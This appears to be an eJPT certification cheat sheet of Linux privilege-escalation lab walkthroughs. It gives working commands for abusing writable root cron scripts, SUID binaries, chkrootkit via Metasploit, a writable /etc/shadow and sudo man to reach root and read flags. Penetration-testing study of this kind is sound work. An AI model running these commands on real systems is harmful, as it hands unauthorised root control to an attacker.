[[Root 𖣂]] | [[eJPT - Cheat Sheets]] | [[eJPT - README]]

<hr>

# Exploiting Misconfigured Cron Jobs

```shell
# There is a message file in the home directory of student user. Only root user has permissions on this file. So, student user can’t even read it.
ls -l
# Find if a file with the same name exists on the system.
find / -name message
# Observe that a file with the same name is present in the /tmp directory. On checking closely, it is clear that this file is being overwritten every minute.
ls -l /tmp/
```

 This means there is some script/binary which is copying this file from the student home directory to /tmp directory. Search for that script. If this script is doing a simple copy operation, it must have the source destination of the file in it. Try to locate that by using the grep command. On trying on different directories one by one (i.e. /, etc, /opt) and on /usr directory, a match has been found.

```shell
grep -nri "/tmp/message" /usr
# `grep`: A command-line tool used to search for specific patterns in files.
# `-n`: Displays the line number in the file where the matching text is found.
# `-r`: Performs a recursive search, meaning it will search through all subdirectories under `/usr`.
# `-i`: Makes the search case-insensitive so it will match `/tmp/message`, `/TMP/MESSAGE`, `/Tmp/Message`, etc.
# `"/tmp/message"`: The search pattern, It looks for any instance of this exact text string.
# `/usr`: The starting directory for the search. The command will look through all files and subfolders within `/usr`.

# Check the permissions on this script file and its contents.
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

As the script file is writable by the current student user, it can be modified to execute our commands. This script is executed by root Cron Job, so it can do privileged operations. But, the file can’t be modified directly as there is no text editor on the system.

```shell
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh
# command not found

# Use printf to replace the original code with the following lines.
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# On execution, these lines will add a new entry to the /etc/sudoers file which will allow the student user to use sudo without providing any password.

cat /usr/local/share/copy.sh

# Check the current sudoers list.
sudo -l

# Switch to the root user using sudo.
sudo su

# Collect the flag from the root directory.
cd /root
ls -l
cat flag
```

<br>

# Exploiting SUID Binaries

Vulnerable setuid on Linux systems could lead to privilege escalation attacks.

```shell
ls -l
# We see two binaries there, greeting and welcome. We can also notice the 's' which stands from SUID permission.
# -rwsr-xr-x 1 root root 8344 Sep 22 2018 welcome
```

Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges. Check the file type.

```shell
file welcome
./greetings # We don't have the permission for this binary
# But we have for
./welcome
```

Investigate the binary. The most easy or preliminary way of doing that is to use strings command.

```shell
strings welcome
# We can see 'greetings' that it calls upon the greetings binary which is very interesting
```

Observe the greetings strings in the output of the strings command. It is possible that welcome binary is calling greetings binary. So, replace the greetings binary with some other binary (say /bin/bash) which should then also get executed as root.

```shell
# Delete greetings binary and then copy /bin/bash to its location and rename that to greetings.
rm greetings
cp /bin/bash greetings
ls

# Then, run the welcome binary again.
./welcome # Execute the bash with root privileges
id
whoami
```

Student user got escalate to root user. Retrieve the flag kept in /root directory.

```shell
ls
cat flag
```

<br>

# Exploiting SUID Binaries

```shell
# Check the permissions each shell has
cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done
# Loops through all valid shell paths listed in /etc/shells and displays their permissions if they exist.
# Useful for checking which shells are present and executable on the system.
# We can use any shell with the permission lrwxrwxrwx for escalation.

# Check for executables with the SetUID bit set that can run with root privileges
find / -perm -4000 2>/dev/null
```

When conducting privilege escalation, identifying SetUID (Set User ID) binaries is critical, as they allow executables to run with the permissions of their owner — often root.

```shell
# We can spawn a new shell with root privileges
find / -exec /bin/rbash -p \; -quit
# Executes /bin/rbash with the -p option from the first file found by 'find', then quits.
# '-p' preserves the environment — potentially bypassing restricted shell protections.
# Useful in privilege escalation or shell escape scenarios.
```

<br>

# Rootkit Scanner

```shell
# To identify the vulnerable program or service, we can list all running processes on the system using the following command:
ps aux # Check for any scripts running that are running chkrootkit as root
# Observe, that there are a couple of processes running i.e. cron and one bash script.
# Investigate the check-down bash script.
cat /bin/check-down
# The chkrootkit rootkit scanner is running as root every 60 seconds. Check the chkrootkit location and its version.
command -v chkrootkit
/bin/chkrootkit -V
# We found the chkrootkit binary location and its version. Searching privilege escalation exploit module for chkrootkit 0.49.

searchsploit chkrootkit 0.49

use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION <set_session_number>
set LHOST <target_IP>
exploit

cat /root/flag
```

<br>

# Linux Privilege Escalation - Permissions Matter!

```shell
# This command searches the entire filesystem (/) for files or directories that are not symbolic links (-not -type l) and are world-writable (-perm -o+w). It helps identify potentially insecure files that anyone on the system can write to, which can be a security risk.
find / -not -type l -perm -o+w

# Observe from the result that /etc/shadow is world writable. Verify the same and also check its contents.
ls -l /etc/shadow
cat /etc/shadow

# Observe that the root password is not set. Adding a known password in the shadow file can escalate to root. Use openssl to generate a password entry. - root:*:... -
openssl passwd -1 -salt abc password

# Copy the generated entry and add it to the root record in /etc/shadow
vim /etc/shadow
<root:HASH:...>

# After making the changes, try to switch to the root user.
su

# Once the escalation to root is complete, retrieve the flag located in /root directory.
cd /root
ls -l
cat flag
```

**Note**: `sudo su` works only if the current user has `sudo` privileges, allowing them to become root directly. If the user is low-privileged and not in the sudoers group, `sudo su` won’t work, and privilege escalation must be done another way. One method is injecting a known password hash into `/etc/shadow`, which allows logging in as root using `su` and that password, even without `sudo` access.

<br>

# Linux Privilege Escalation - SUDO Privileges

We are now trying to escalate privileges to get root. After some digging around and from other sources, we figured out that the same person in the organization uses both the student account and the root account on the system.

```shell
find / -user root -perm -4000 -exec ls -ldb {} \;
# Searches the entire filesystem (/) for files that are owned by root and have the SUID (Set User ID) bit set — represented by 4000. The SUID permission allows a file to be executed with the privileges of its owner (in this case, root), which can be exploited for privilege escalation if the file is vulnerable. The -exec ls -ldb {} part lists each found file with detailed permissions and ownership info.

# No anomaly is there. Move on to finding misconfigured sudo. Check the current sudo capabilities. Check if we can run sudo without a password
sudo -l

# The man entry depicts that the man command can be run using sudo without providing any password. Run it and launch /bin/bash from it
# We got (root) NOPASSWD: /usr/bin/man
# This means the user student is allowed to run the man command as root without needing a password using sudo.
sudo man ls
# Once inside the manual page:
!/bin/bash
# You now have a root shell
cd /root
ls -l
cat flag
```
